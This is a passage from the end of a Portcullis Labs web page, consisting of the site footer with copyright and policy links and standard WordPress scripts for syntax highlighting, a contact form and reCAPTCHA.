      <p style="text-align: left;"><span style="color: #ffffff; font-size: 12px; font-family: Tahoma;">© Portcullis Computer Security Ltd & Portcullis Inc. All rights reserved. ® 1992 - 2017.</span></p>
    </div><div class="portcullis-layout-cell" style="width: 50%">
        <p style="text-align: right;"><span style="color: #ffffff; font-size: 12px; font-family: Tahoma;"><a href="https://portcullislabs.github.io/terms-of-use/">Terms of Use</a> </span>| <span style="color: #ffffff; font-size: 12px; font-family: Tahoma;"><a href="https://portcullislabs.github.io/privacy-and-cookies/">Privacy and Cookies</a></span></p>
    </div>
    </div>
</div></footer>

    </div>
</div>



<div id="wp-footer">
	<script type='text/javascript' src='https://portcullislabs.github.io/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.9b'></script>
<script type='text/javascript' src='https://portcullislabs.github.io/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushBash.js?ver=3.0.9b'></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://portcullislabs.github.io/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
		var themecssurl = "https://portcullislabs.github.io/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeMidnight.css?ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.all();
</script>
<script type='text/javascript' src='https://portcullislabs.github.io/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.23'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var _wpcf7 = {"loaderUrl":"https:\/\/portcullislabs.github.io\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","sending":"Sending ..."};
/* ]]> */
</script>
<script type='text/javascript' src='https://portcullislabs.github.io/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=3.3.2'></script>
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?onload=contact_form_7_recaptcha_callback&#038;render=explicit&#038;ver=1.0.0'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var contact_form_7_recaptcha_data = {"sitekey":"6LdFERITAAAAAJKGS2TEXuWsyOxc-KxvAZBC8zE2"};
/* ]]> */
</script>
<script type='text/javascript' src='https://portcullislabs.github.io/wp-content/plugins/contact-form-7-recaptcha/script.js?ver=1.0.0'></script>
	<!-- 63 queries. 0.088 seconds. -->
</div>
</body>
</html>

